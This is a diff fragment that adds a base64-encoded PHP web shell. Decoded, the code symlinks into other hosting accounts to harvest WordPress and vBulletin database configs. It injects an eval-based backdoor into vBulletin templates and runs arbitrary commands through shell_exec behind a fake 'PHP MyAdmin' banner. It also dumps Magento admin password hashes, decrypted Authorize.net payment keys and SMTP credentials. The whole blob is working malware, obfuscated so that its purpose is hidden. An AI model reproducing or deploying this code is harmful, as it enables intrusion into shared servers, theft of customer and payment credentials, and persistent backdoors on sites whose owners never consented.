+Cgp9ZWxzZXsKCiR4ZmYgPSBAZmlsZSgibmFtZWQudHh0Iik7CgoKfQppZighJHhmZikKewoKZGll
+ICgiPG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDsgdXJsPT9zd3M9cmVhZCcv
+PiIpOwp9CmVsc2UKCnsKZWNobyAiPGRpdiBjbGFzcz0ndG1wJz4KPGZvcm0gbWV0aG9kPSdQT1NU
+JyBhY3Rpb249JyR4ZmU/c3dzPXdwJz4KPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J01hc3Mg
+Q2hhbmdlIEFkbWluJyAvPgo8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nMScgbmFtZT0ncycg
+Lz4KPC9mb3JtPgo8YnIgLz48YnIgLz4KPHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUn
+Pjx0ZD4gRG9tYWlucyA8L3RkPjx0ZD4gY29uZmlnIDwvdGQ+PHRkPiBSZXN1bHQgPC90ZD4iOwoK
+Zmx1c2goKTsKZmx1c2goKTsKCiR4ZmQgPSBmb3Blbignd3AudHh0JywndycpOwoKZm9yZWFjaCgk
+eGZmIGFzICR4MTAwKXsKCmlmKGVyZWdpKCJ6b25lIiwkeDEwMCkpewoKcHJlZ19tYXRjaF9hbGwo
+JyN6b25lICIoLiopIiMnLCAkeDEwMCwgJHgxMDEpOwoKaWYoc3RybGVuKHRyaW0oJHgxMDFbMV1b
+MF0pKSA+IDIpewoKJHgxMDIgPSBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCIvZXRjL3ZhbGlh
+c2VzLyIuJHgxMDFbMV1bMF0pKTsKCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgokeDExZT0k
+eGY5LiIvc3ltL3Jvb3QvaG9tZS8iLiR4MTAyWyduYW1lJ10uIi9wdWJsaWNfaHRtbC93cC1jb25m
+aWcucGhwIjsKJHgxMWY9Z2V0X2hlYWRlcnMoJHgxMWUpOwokeDEyMD0keDExZlswXTsKCiR4MTIx
+PSR4ZjkuIi9zeW0vcm9vdC9ob21lLyIuJHgxMDJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2Jsb2cv
+d3AtY29uZmlnLnBocCI7CiR4MTIyPWdldF9oZWFkZXJzKCR4MTIxKTsKJHgxMjM9JHgxMjJbMF07
+CgokeDEyND0keGY5LiIvc3ltL3Jvb3QvaG9tZS8iLiR4MTAyWyduYW1lJ10uIi9wdWJsaWNfaHRt
+bC93cC93cC1jb25maWciOwokeDEyNT1nZXRfaGVhZGVycygkeDEyNCk7CiR4MTI2PSR4MTI1WzBd
+OwoKCi8vLy8vLy8vLy8gd3AgLy8vLy8vLy8vLy8vCgokeDQ2ID0gc3RycG9zKCR4MTIwLCAiMjAw
+Iik7CiR4MTEwPSImbmJzcDsiOwoKaWYgKHN0cnBvcygkeDEyMCwgIjIwMCIpID09IHRydWUgKQp7
+CiR4MTEwPSAkeDExZTsKfQplbHNlaWYgKHN0cnBvcygkeDEyMywgIjIwMCIpID09IHRydWUpCnsK
+JHgxMTA9ICR4MTIxOwp9CmVsc2VpZiAoc3RycG9zKCR4MTI2LCAiMjAwIikgPT0gdHJ1ZSkKewok
+eDExMD0gJHgxMjQ7Cn0KZWxzZQp7CmNvbnRpbnVlOwoKfQpmbHVzaCgpOwoKLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLwoKJHgxMDAgPSAkeDEwMVsxXVswXTsKCiR4MTA5ID0gZndyaXRlKCR4
+ZmQsIiR4MTEwfHwkeDEwMCBcbiIpOwppZigkeDEwOSl7JHgxMWQgPSAnPGIgc3R5bGU9ImNvbG9y
+OiAjMDA2NjAwIj5TYXZlPC9iPic7fWVsc2V7JHgxMWQgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+
+ZmFpbGVkPC9iPic7fQoKCmVjaG8gIjx0cj48dGQ+PGEgaHJlZj1odHRwOi8vd3d3LiIuJHgxMDFb
+MV1bMF0uIj4iLiR4MTAxWzFdWzBdLiI8L2E+PC90ZD4KPHRkPjxhIGhyZWY9JyR4MTEwJz5jb25m
+aWc8L2E+PC90ZD48dGQ+Ii4keDExZC4iPC90ZD48L3RyPiI7CmZsdXNoKCk7CmZsdXNoKCk7CgoK
+CgoKZmx1c2goKTsKCgp9Cn0KfQp9CgoKYnJlYWs7CgoKY2FzZSAndmInOgoKCmlmKGlzc2V0KCRf
+UE9TVFsncyddKSl7CgoKCiR4MjkgPSBAZmlsZV9nZXRfY29udGVudHMoJ3ZiLnR4dCcpOwoKJHgx
+MGQgPSBleHBsb2RlKCJcbiIsJHgyOSk7CgplY2hvICI8ZGl2IGNsYXNzPSd0bXAnPjx0YWJsZSBh
+bGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IGRvbWluIDwvdGQ+PHRkPiBjb25maWcgPC90
+ZD48dGQ+IFJlc3VsdCA8L3RkPiI7CgoKZm9yZWFjaCAoJHgxMGQgYXMgJHgxMGUpewoKJHgxMGYg
+PSBleHBsb2RlKCJ8fCIsJHgxMGUpOwoKJHgxMTAgPSAkeDEwZlswXTsKCiR4MTExID0gJHgxMGZb
+MV07CgokeDExMiA9IHRyaW0oJHgxMTEpLicnOwoKJHgxMTMgPSBAZmlsZV9nZXRfY29udGVudHMo
+dHJpbSgkeDExMCkpOwoKaWYoZXJlZygndkJ1bGxldGluJywkeDExMykpewoKCgokeDExNiA9IGV4
+KCR4MTEzLCckeDExMFtcJ0RhdGFiYXNlXCddW1wnZGJuYW1lXCddID0gXCcnLCInOyIpOwoKJHgx
+MTUgPSBleCgkeDExMywnJHgxMTBbXCdNYXN0ZXJTZXJ2ZXJcJ11bXCd1c2VybmFtZVwnXSA9IFwn
+JywiJzsiKTsKCiR4MTE0ID0gZXgoJHgxMTMsJyR4MTEwW1wnTWFzdGVyU2VydmVyXCddW1wncGFz
+c3dvcmRcJ10gPSBcJycsIic7Iik7CgokeDExYSA9IEBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3Qn
+LCR4MTE1LCR4MTE0KTsKCiR4MTE2ID0gQG15c3FsX3NlbGVjdF9kYigkeDExNiwkeDExYSk7Cgok
+eDEyOCA9ICJiVkRQUzhNd0ZMNEwvZyt2WVpBV2RQUGlhVXYxNGtBUUZLcW5VVXFhcGpTWU5LRkp4
+Q243MzIyYWJnemNJZkR5dmwrUDcvcUtzMDREM3RTNXNKOTZNTUo5YitvaER3OHZUV2NxMzFQRjAy
+eUpwL1dxenZFYVprMnJCd1dVT2FGN2doQW83anJkRUdTMGRRaDR6OXplY0lLVWwwNFlPcmhWNE44
+MjFGRUV3WlFnYjZTbURSOFFpT2JzZHhZaGV1TWRSS05XU0g1VXh0bUtuM0crdjBQNVRJeGdOVHFo
+V1dSOXJZU0xBWEgvUmFVZmdZOHBiVlJPWjRWSTBhYXdxTjVlaS9jZERsUmNBaUZ3SkVJR3Y0SHl5
+TFRacDR0cSsvenlWT3h3T0FTWE8reVVxVUk2TG0vZ0h4aUJMRGljNm82MlVIakd1TFdRSkVrbzk5
+VDlHZzdBcGVVWEpGc3E1RVgrQVI3eVB3PT0iIDsKCiR4MTI5ID0gIntcJHtldmFsKGd6aW5mbGF0
+ZShiYXNlNjRfZGVjb2RlKFwnIjsKCiR4MTI5IC49ICIkeDEyOCI7CgokeDEyOSAuPSAiXCcpKSl9
+fXtcJHtleGl0KCl9fTwvdGV4dGFyZWE+IjsKCiR4MTJhID0gIlVQREFURSB0ZW1wbGF0ZSBTRVQg
+dGVtcGxhdGUgPSciLiR4MTI5LiInIFdIRVJFIHRpdGxlID0nRkFRJyIgOwoKJHgxMWIgPSBAbXlz
+cWxfcXVlcnkoJHgxMmEsJHgxMWEpOwoKCgppZiAoJHgxMWIpeyR4MTFkID0gJzxiIHN0eWxlPSJj
+b2xvcjogIzAwNjYwMCI+U3VjY2VlZDwvYj4gc2hlbGwgaW4gc2VhcmNoLnBocCc7fQoKZWxzZQoK
+ewoKJHgxMWQgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7Cgp9CgokeDExMiA9
+IHRyaW0oJHgxMTEpLicnOwoKZWNobyAiPHRyPgo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9
+J2h0dHA6Ly8keDExMic+JHgxMTE8L2E+PC90ZD4KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVm
+PSckeDExMCc+Y29uZmlnPC9hPjwvdGQ+PHRkPiIuJHgxMWQuIjwvdGQ+PC90cj4iOwoKCgoKCgoK
+fWVsc2V7CgplY2hvICI8dHI+Cjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0naHR0cDovLyR4
+MTEyJz4keDExMTwvYT48L3RkPgo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8k
+eDExMCc+Y29uZmlnPC9hPjwvdGQ+PHRkPjxiIHN0eWxlPSdjb2xvcjpyZWQnPmZhaWxlZDI8L2I+
+PC90ZD48L3RyPiI7Cn0KCn0KCgoKCgoKCgoKCmRpZSgpOwoKfQoKaWYoIWlzX2ZpbGUoJ25hbWVk
+LnR4dCcpKXsKCiR4ZmYgPSBmaWxlKCIvZXRjL25hbWVkLmNvbmYiKTsKCn1lbHNlewoKJHhmZiA9
+IGZpbGUoIm5hbWVkLnR4dCIpOwoKCn0KaWYoISR4ZmYpCnsKCmRpZSAoIjxtZXRhIGh0dHAtZXF1
+aXY9J3JlZnJlc2gnIGNvbnRlbnQ9JzA7IHVybD0/c3dzPXJlYWQnLz4iKTsKfQplbHNlCgp7CmVj
+aG8gIjxkaXYgY2xhc3M9J3RtcCc+Cjxmb3JtIG1ldGhvZD0nUE9TVCcgYWN0aW9uPSckeGZlP3N3
+cz12Yic+CjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdJbmplY3Qgc2hlbGwnIC8+CjxpbnB1
+dCB0eXBlPSdoaWRkZW4nIHZhbHVlPScxJyBuYW1lPSdzJyAvPgo8L2Zvcm0+CjxiciAvPjxiciAv
+Pgo8dGFibGUgYWxpZ249J2NlbnRlcicgd2lkdGg9JzQwJSc+PHRkPiBEb21haW5zIDwvdGQ+PHRk
+PiBjb25maWcgPC90ZD48dGQ+IFJlc3VsdCA8L3RkPiI7CgokeGZkID0gZm9wZW4oJ3ZiLnR4dCcs
+J3cnKTsKCmZvcmVhY2goJHhmZiBhcyAkeDEwMCl7CgppZihlcmVnaSgiem9uZSIsJHgxMDApKXsK
+CnByZWdfbWF0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywgJHgxMDAsICR4MTAxKTsKCmlmKHN0cmxl
+bih0cmltKCR4MTAxWzFdWzBdKSkgPiAyKXsKCiR4MTAyID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVv
+d25lcigiL2V0Yy92YWxpYXNlcy8iLiR4MTAxWzFdWzBdKSk7CgovLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLwoKJHgxMWU9JHhmOS4iL3N5bS9yb290L2hvbWUvIi4keDEwMlsnbmFtZSddLiIvaW5j
+bHVkZXMvY29uZmlnLnBocCI7CiR4MTFmPWdldF9oZWFkZXJzKCR4MTFlKTsKJHgxMjA9JHgxMWZb
+MF07CgokeDEyMT0keGY5LiIvc3ltL3Jvb3QvaG9tZS8iLiR4MTAyWyduYW1lJ10uIi92Yi9pbmNs
+dWRlcy9jb25maWcucGhwIjsKJHgxMjI9Z2V0X2hlYWRlcnMoJHgxMjEpOwokeDEyMz0keDEyMlsw
+XTsKCiR4MTI0PSR4ZjkuIi9zeW0vcm9vdC9ob21lLyIuJHgxMDJbJ25hbWUnXS4iL2ZvcnVtL2lu
+Y2x1ZGVzL2NvbmZpZy5waHAiOwokeDEyNT1nZXRfaGVhZGVycygkeDEyNCk7CiR4MTI2PSR4MTI1
+WzBdOwoKCi8vLy8vLy8vLy8gdmIgLy8vLy8vLy8vLy8vCgokeDQ2ID0gc3RycG9zKCR4MTIwLCAi
+MjAwIik7CiR4MTEwPSImbmJzcDsiOwoKaWYgKHN0cnBvcygkeDEyMCwgIjIwMCIpID09IHRydWUg
+KQp7CiR4MTEwPSAkeDExZTsKfQplbHNlaWYgKHN0cnBvcygkeDEyMywgIjIwMCIpID09IHRydWUp
+CnsKJHgxMTA9ICR4MTIxOwp9CmVsc2VpZiAoc3RycG9zKCR4MTI2LCAiMjAwIikgPT0gdHJ1ZSkK
+ewokeDExMD0gJHgxMjQ7Cn0KZWxzZQp7CmNvbnRpbnVlOwoKfQpmbHVzaCgpOwoKLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLwoKJHgxMDAgPSAkeDEwMVsxXVswXTsKCiR4MTA5ID0gZndyaXRl
+KCR4ZmQsIiR4MTEwfHwkeDEwMCBcbiIpOwppZigkeDEwOSl7JHgxMWQgPSAnPGIgc3R5bGU9ImNv
+bG9yOiAjMDA2NjAwIj5TYXZlPC9iPic7fWVsc2V7JHgxMWQgPSAnPGIgc3R5bGU9ImNvbG9yOnJl
+ZCI+ZmFpbGVkPC9iPic7fQoKCmVjaG8gIjx0cj48dGQ+PGEgaHJlZj1odHRwOi8vd3d3LiIuJHgx
+MDFbMV1bMF0uIj4iLiR4MTAxWzFdWzBdLiI8L2E+PC90ZD4KPHRkPjxhIGhyZWY9JyR4MTEwJz5j
+b25maWc8L2E+PC90ZD48dGQ+Ii4keDExZC4iPC90ZD48L3RyPiI7CgoKCgoKZmx1c2goKTsKCgp9
+Cn0KfQp9CgoKCgoKCgoKYnJlYWs7CgpjYXNlICdoZWxwJzoKCmVjaG8gIjxkaXYgY2xhc3M9J3Rt
+cCc+Cjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+ZnVuY3Rpb248L3RkPjx0
+ZD5DYXNlPC90ZD4iOwoKCiR4MTJiID0gaW5pX2dldCgnc2FmZV9tb2RlJyk7CmlmKCR4MTJiKXsk
+eDExZCA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskeDExZCA9ICI8
+YiBzdHlsZT0nY29sb3I6ICMzMzY2MDAnPlRydWU8L2I+Ijt9CgplY2hvICI8dHI+PHRkPlNhZmUg
+TW9kZTwvdGQ+PHRkPiR4MTFkPC90ZD4iOwoKJHgxMmMgPSBmdW5jdGlvbl9leGlzdHMoJ3N5bWxp
+bmsnKTsKaWYoISR4MTJjKXskeDExZCA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+
+Ijt9ZWxzZXskeDExZCA9ICI8YiBzdHlsZT0nY29sb3I6ICMzMzY2MDAnPlRydWU8L2I+Ijt9Cgpl
+Y2hvICI8dHI+PHRkPmZ1bmN0aW9uIHN5bWxpbms8L3RkPjx0ZD4keDExZDwvdGQ+IjsKCgokeDEy
+YyA9IGZ1bmN0aW9uX2V4aXN0cygnZmlsZScpOwppZighJHgxMmMpeyR4MTFkID0gIjxiIHN0eWxl
+PSdjb2xvcjogcmVkJz5GYWxzZTwvYj4iO31lbHNleyR4MTFkID0gIjxiIHN0eWxlPSdjb2xvcjog
+IzMzNjYwMCc+VHJ1ZTwvYj4iO30KCmVjaG8gIjx0cj48dGQ+ZnVuY3Rpb24gZmlsZTwvdGQ+PHRk
+PiR4MTFkPC90ZD4iOwoKJHgxMmMgPSBmdW5jdGlvbl9leGlzdHMoJ2ZpbGVfZ2V0X2NvbnRlbnRz
+Jyk7CmlmKCEkeDEyYyl7JHgxMWQgPSAiPGIgc3R5bGU9J2NvbG9yOiByZWQnPkZhbHNlPC9iPiI7
+fWVsc2V7JHgxMWQgPSAiPGIgc3R5bGU9J2NvbG9yOiAjMzM2NjAwJz5UcnVlPC9iPiI7fQoKZWNo
+byAiPHRyPjx0ZD5mdW5jdGlvbiBmaWxlX2dldF9jb250ZW50czwvdGQ+PHRkPiR4MTFkPC90ZD4i
+OwoKJHgxMmMgPSBmdW5jdGlvbl9leGlzdHMoJ21rZGlyJyk7CmlmKCEkeDEyYyl7JHgxMWQgPSAi
+PGIgc3R5bGU9J2NvbG9yOiByZWQnPkZhbHNlPC9iPiI7fWVsc2V7JHgxMWQgPSAiPGIgc3R5bGU9
+J2NvbG9yOiAjMzM2NjAwJz5UcnVlPC9iPiI7fQoKZWNobyAiPHRyPjx0ZD5mdW5jdGlvbiBta2Rp
+cjwvdGQ+PHRkPiR4MTFkPC90ZD4iOwoKCiR4MTJjID0gaXNfZGlyKCdzeW0vcm9vdCcpOwppZigh
+JHgxMmMpeyR4MTFkID0gIjxiIHN0eWxlPSdjb2xvcjogcmVkJz5GYWxzZTwvYj4iO31lbHNleyR4
+MTFkID0gIjxiIHN0eWxlPSdjb2xvcjogIzMzNjYwMCc+VHJ1ZTwvYj4iO30KCmVjaG8gIjx0cj48
+dGQ+UGVybWlzc2lvbiBkZW5pZWQ8L3RkPjx0ZD4keDExZDwvdGQ+IjsKCgokeDEyYyA9IHByZWdf
+bWF0Y2goJy9Gb3JiaWRkZW4vJyxAZmlsZV9nZXRfY29udGVudHMoJ3N5bS9yb290Jykgb3IgIUBm
+aWxlX2dldF9jb250ZW50cygnc3ltL3Jvb3QnKSk7CmlmKCR4MTJjKXskeDExZCA9ICI8YiBzdHls
+ZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskeDExZCA9ICI8YiBzdHlsZT0nY29sb3I6
+ICMwMDY2MDAnPlRydWU8L2I+Ijt9CgplY2hvICI8dHI+PHRkPkZvcmJpZGRlbjwvdGQ+PHRkPiR4
+MTFkPC90ZD4iOwoKCgoKZWNobyAiPC90YWJsZT48L2Rpdj4iOwoKCgpicmVhazsKZGVmYXVsdDoK
+aGVhZGVyKCJMb2NhdGlvbjogJHhmZSIpOwoKCgoKfQoKCgplY2hvICcKPGJyIC8+PGJyIC8+PGJy
+Pic7Cgp9CgoKZnVuY3Rpb24gZXgoJHgxMmQsJHgxMmUsJHgxNil7CiR4MTJmID0gZXhwbG9kZSgk
+eDEyZSwkeDEyZCk7CiR4MTJmID0gZXhwbG9kZSgkeDE2LCR4MTJmWzFdKTsKcmV0dXJuICR4MTJm
+WzBdOwp9CgoKCmVjaG8gJzwvZGl2PgoKCgoKCjwvYm9keT4KCjwvaHRtbD48L2NlbnRlcj4KJzsK
+CWVjaG8nPGJvZHkgYmdjb2xvcj0iYmxhY2siID4KCTxjZW50ZXI+Cgk8YnI+Cgk8Rk9STSBhY3Rp
+b249IiIgIG1ldGhvZD0icG9zdCI+Cgk8ZGl2IGFsaWduPSJjZW50ZXIiPjxicj4KCTxkaXYgYWxp
+Z249ImNlbnRlciI+PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsgICAgUEhQIE15QWRtaW4g
+ICAgXT09PT09PT09PT09PT09PT09PT09PT09PT09PT08YnI+PGJyPgoJPGlucHV0IHR5cGU9Imhp
+ZGRlbiIgbmFtZT0iZm9ybV9hY3Rpb24iIHZhbHVlPSIyIj4KCTwvZGl2PgoJPC9kaXY+CgknOwoJ
+aWYoJF9HRVRbJ0hzSCddKXtlY2hvIjxwcmU+Ii5zaGVsbF9leGVjKCRfR0VUWyJIc0giXSk7fQoJ
+aWYoZmlsZV9leGlzdHMoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nL2FwcC9ldGMvbG9jYWwu
+eG1sJykpewoJCSR4MTMwID0gc2ltcGxleG1sX2xvYWRfZmlsZSgkX1NFUlZFUlsnRE9DVU1FTlRf
+Uk9PVCddLicvYXBwL2V0Yy9sb2NhbC54bWwnKTsKCQlpZihpc3NldCgkeDEzMC0+Z2xvYmFsLT5y
+ZXNvdXJjZXMtPmRlZmF1bHRfc2V0dXAtPmNvbm5lY3Rpb24pKSB7CgkJICAgJHg5NSA9ICR4MTMw
+LT5nbG9iYWwtPnJlc291cmNlcy0+ZGVmYXVsdF9zZXR1cC0+Y29ubmVjdGlvbjsKCQkgICAkeDEz
+MSA9ICR4MTMwLT5nbG9iYWwtPnJlc291cmNlcy0+ZGItPnRhYmxlX3ByZWZpeDsKCQkgICAkeDEz
+ID0gJHgxMzAtPmdsb2JhbC0+Y3J5cHQtPmtleTsgLy9mOGNkMTg4MWUzYmYyMDEwOGQ1ZjQ5NDdl
+NjBhY2ZjMQoJCSAgIHJlcXVpcmVfb25jZSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvYXBw
+L01hZ2UucGhwJzsKCQkgICAKCQkgICB0cnkgewoJCQkgICAkeDEzMiA9IE1hZ2U6OmFwcCgnZGVm
+YXVsdCcpOwoJCQkgICBNYWdlOjpnZXRTaW5nbGV0b24oJ2NvcmUvc2Vzc2lvbicsIGFycmF5KCdu
+YW1lJz0+J2Zyb250ZW5kJykpOwoJCSAgIH1jYXRjaChFeGNlcHRpb24gJHg1MykgeyBlY2hvICdN
+ZXNzYWdlOiAnIC4keDUzLT5nZXRNZXNzYWdlKCkuIjxici8+XG4iO30KCgkJICAgaWYgKCFteXNx
+bF9jb25uZWN0KCR4OTUtPmhvc3QsICR4OTUtPnVzZXJuYW1lLCAkeDk1LT5wYXNzd29yZCkpewoJ
+CQkgICBwcmludCgiQ291bGQgbm90IGNvbm5lY3Q6ICIgLiBteXNxbF9lcnJvcigpKTsKCQkgICB9
+CgkJICAgbXlzcWxfc2VsZWN0X2RiKCR4OTUtPmRibmFtZSk7CgkJICAgZWNobyAkeDk1LT5ob3N0
+LiJ8Ii4keDk1LT51c2VybmFtZS4ifCIuJHg5NS0+cGFzc3dvcmQuInwiLiR4OTUtPmRibmFtZS4i
+fCAkeDEzMSB8ICR4MTM8YnIvPlxuIjsKCgkJJHgxMzMgPSBuZXcgVmFyaWVuX0NyeXB0X01jcnlw
+dCgpOwoJCSR4MTMzLT5pbml0KCR4MTMpOwoKCQkvLz09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PQoJCSR4MTFiID0gbXlzcWxfcXVlcnkoIlNFTEVDVCB1c2Vy
+X2lkLGZpcnN0bmFtZSxsYXN0bmFtZSxlbWFpbCx1c2VybmFtZSxwYXNzd29yZCBGUk9NIGFkbWlu
+X3VzZXIgd2hlcmUgaXNfYWN0aXZlID0gJzEnIik7CgkJaWYgKCEkeDExYil7CgkJCSAgZWNobyAi
+PGNlbnRlcj48Yj5HYWdhbDwvYj48L2NlbnRlcj4iOwoJCX1lbHNlewoJCQkJJHhmNCA9IG15c3Fs
+X2ZldGNoX2FycmF5KG15c3FsX3F1ZXJ5KCJTRUxFQ1QgdmFsdWUgYXMgd2Vic2l0ZSBGUk9NIGNv
+cmVfY29uZmlnX2RhdGEgV0hFUkUgcGF0aD0nd2ViL3Vuc2VjdXJlL2Jhc2VfdXJsJyIpKTsKCQkJ
+ICBlY2hvJzxicj48YnI+CgkJCQkJPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT08YnI+CgkJCQkJCQkJCVsgQWRtaW4gd2Vi
+c2l0ZW55YSA6ICcuJHhmNFsnd2Vic2l0ZSddLiddIDxicj4KCQkJCQk9PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTxicj4n
+OwoJCX0KCQllY2hvICIKCQk8dGFibGUgYm9yZGVyPScxJyBhbGlnbj0nY2VudGVyJyA+CgkJPHRy
+PgoJCTx0ZD5pZDwvdGQ+CgkJPHRkPmZpcnN0bmFtZTwvdGQ+CgkJPHRkPmxhc3RuYW1lPC90ZD4K
+CQk8dGQ+ZW1haWw8L3RkPgoJCTx0ZD51c2VybmFtZTwvdGQ+CgkJPHRkPnBhc3N3b3JkPC90ZD4K
+CQk8L3RyPiI7CgkJCXdoaWxlKCR4MTM0ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHgxMWIpKSB7CgkJ
+CSR4MTM1ID0gMTsKCQkJJHgxMzYgPSAkeDEzNFsndXNlcl9pZCddOwoJCQkkeDNhID0gJHgxMzRb
+J3VzZXJuYW1lJ107CgkJCSR4M2IgPSAkeDEzNFsncGFzc3dvcmQnXTsKCQkJJHgxMzcgPSAkeDEz
+NFsnZW1haWwnXTsKCQkJJHgxMzggPSAkeDEzNFsnZmlyc3RuYW1lJ107CgkJCSR4MTM5ID0gJHgx
+MzRbJ2xhc3RuYW1lJ107CgkJCWVjaG8gIjx0cj48cHJlPjx0ZD4keDEzNjwvdGQ+PHRkPiR4MTM4
+PC90ZD48dGQ+JHgxMzk8L3RkPjx0ZD4keDEzNzwvdGQ+PHRkPiR4M2E8L3RkPjx0ZD4keDNiPC90
+ZD48L3ByZT48L3RyPiI7CgkJCX0gCgkJZWNobyAiPC90YWJsZT48YnI+IjsKCQkvLz09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoJCSR4MTFiID0gbXlzcWxf
+cXVlcnkoIlNFTEVDVCB2YWx1ZSBhcyB1c2VyLChTRUxFQ1QgdmFsdWUgRlJPTSBjb3JlX2NvbmZp
+Z19kYXRhIHdoZXJlICBwYXRoID0gJ3BheW1lbnQvYXV0aG9yaXplbmV0L3RyYW5zX2tleScpIGFz
+IHBhc3MgRlJPTSBjb3JlX2NvbmZpZ19kYXRhIHdoZXJlIHBhdGggPSAncGF5bWVudC9hdXRob3Jp
+emVuZXQvbG9naW4nIik7CgkJaWYobXlzcWxfbnVtX3Jvd3MoJHgxMWIpICE9IDApewoJCQlpZiAo
+ISR4MTFiKXsKCQkJCSAgZWNobyAiPGNlbnRlcj48Yj5HYWdhbDwvYj48L2NlbnRlcj4iOwoJCQl9
+ZWxzZXsKCQkJCSAgZWNobyc8YnI+PGJyPgoJCQkJCQk9PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTxicj4KCQkJCQkJCQkJ
+CVsgQXV0aG9yaXplbmV0IF0gPGJyPgoJCQkJCQk9PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTxicj4nOwoJCQl9CgkJCWVj
+aG8gIgoJCQk8dGFibGUgYm9yZGVyPScxJyBhbGlnbj0nY2VudGVyJyA+CgkJCTx0cj4KCQkJPHRk
+Pm5vPC90ZD4KCQkJPHRkPnVzZXI8L3RkPgoJCQk8dGQ+cGFzczwvdGQ+CQoJCQk8L3RyPiI7CgkJ
+CQkkeDEzNSA9IDE7CgkJCQl3aGlsZSgkeDEzNCA9IG15c3FsX2ZldGNoX2FycmF5KCR4MTFiKSkg
+ewoJCQkJJHgxMDIgPSAkeDEzMy0+ZGVjcnlwdCgkeDEzNFsndXNlciddKTsKCQkJCSR4MTE0ID0g
+JHgxMzMtPmRlY3J5cHQoJHgxMzRbJ3Bhc3MnXSk7CgoJCQkJCgkJCQllY2hvICI8dHI+PHByZT48
+dGQ+JHgxMzU8L3RkPjx0ZD4keDEwMjwvdGQ+PHRkPiR4MTE0PC90ZD48L3ByZT48L3RyPiI7CgkJ
+CQkkeDEzNSsrOwoJCQkJfSAKCQkJZWNobyAiPC90YWJsZT48YnI+IjsKCQl9CgkJLy89PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCQkkeDEzYSA9IG15c3Fs
+X3F1ZXJ5KCJTRUxFQ1QgKFNFTEVDVCBhLnZhbHVlIEZST00gY29yZV9jb25maWdfZGF0YSBhcyBh
+IFdIRVJFIHBhdGggPSAnc3lzdGVtL3NtdHBzZXR0aW5ncy9ob3N0JykgYXMgaG9zdCAsIChTRUxF
+Q1QgYi52YWx1ZSBGUk9NIGNvcmVfY29uZmlnX2RhdGEgYXMgYiBXSEVSRSBwYXRoID0gJ3N5c3Rl
+bS9zbXRwc2V0dGluZ3MvcG9ydCcpIGFzIHBvcnQsKFNFTEVDVCBjLnZhbHVlIEZST00gY29yZV9j
+b25maWdfZGF0YSBhcyBjIFdIRVJFIHBhdGggPSAnc3lzdGVtL3NtdHBzZXR0aW5ncy91c2VybmFt
+ZScpIGFzIHVzZXIgLChTRUxFQ1QgZC52YWx1ZSBGUk9NIGNvcmVfY29uZmlnX2RhdGEgYXMgZCBX
+SEVSRSBwYXRoID0gJ3N5c3RlbS9zbXRwc2V0dGluZ3MvcGFzc3dvcmQnKSBhcyBwYXNzIEZST00g
